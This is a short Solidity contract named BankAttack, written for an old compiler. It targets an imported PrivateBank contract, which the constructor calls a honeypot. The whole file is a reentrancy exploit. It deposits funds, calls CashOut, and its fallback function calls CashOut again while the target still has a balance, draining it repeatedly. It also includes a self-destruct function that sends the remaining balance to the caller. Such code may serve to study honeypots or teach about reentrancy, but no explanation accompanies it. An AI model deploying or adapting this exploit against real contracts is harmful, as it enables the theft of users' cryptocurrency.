pragma solidity ^0.4.8;
import "./PrivateBank.sol";
contract BankAttack {
  PrivateBank public privatebank;
  address public adr = this;
  function BankAttack (address _honeypot) {
    privatebank = PrivateBank(_honeypot);
  }
  function kill () {
    suicide(msg.sender);
  }
  function collect() payable {
    privatebank.Deposit.value(msg.value)();
    privatebank.CashOut();
  }
  function put() payable {
    privatebank.Deposit.value(msg.value)();
  }
  function () payable {
    if (privatebank.balance >= msg.value) {
      privatebank.CashOut();
    }
  }
}